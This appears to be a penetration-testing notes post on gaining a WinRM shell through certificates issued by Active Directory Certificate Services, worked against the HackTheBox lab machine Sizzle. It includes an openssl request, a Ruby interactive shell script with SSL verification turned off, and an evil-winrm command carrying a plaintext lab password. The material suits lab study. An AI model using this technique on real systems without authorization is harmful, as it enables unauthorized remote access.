---
description: >-
  WinRM Certificate (password-less) based authentication
title: WinRM Certificate (password-less) based authentication              # Add title here
date: 2023-01-29 08:00:00 -0600                           # Change the date to match completion date
categories: [12 Active Directory, Authentication]          # Change Templates to Writeup
tags: [active directory, authentication, winrm, passwordless based authentication]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### WINRM Certificate
We can authenticate via WINRM by creating a certificate, this is an AD CS feature. As we can check on this [notes](https://notes.offsec-journey.com/enumeration/winrm) all we need to do is follow this steps:

- Pre-requisites: Access to Active Directory Certificate Services
- Default location: `http://<IP>/certsrv/`
- Script Link: [win-rm.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)
  
```bash
#Certificate signing request
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr # All the options required are by default
```
Then we proceed to sign certificate as user by Sign-in to `http://10.10.10.103/certsrv`  and paste the content of amanda.csr into the text field:
![Winrm-auth-certificate](/assets/img/Pasted image 20230129030758.png)
Download base64-encoded certificate:
![winrm-base64-cert](/assets/img/Pasted image 20230129030850.png)
And modify the winrm_shell.rb script:
#Note `remember to run the script in the same folder as in certnew.cer and amanda.key`
```bash
require 'winrm'
# Author: Alamot
conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  :client_cert => 'certnew.cer',
  :client_key => 'amanda.key',
  :no_ssl_peer_verification => true
)
command=""
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
Finally run the script and you're in:
```bash
ruby winrm_shell.rb
PS htb\amanda@SIZZLE Documents>
```
Examples:
[Sizzle](https://shuciran.github.io/posts/Sizzle/#fnref:winrm-auth-cert)
### evil-winrm
It is also possible to authenticate via evil-winrm:
```bash
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Resources:
[Certificate authentication in Win-RM](http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm)
[offsec journey notes](https://notes.offsec-journey.com/enumeration/winrm) 
[win-rm.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)

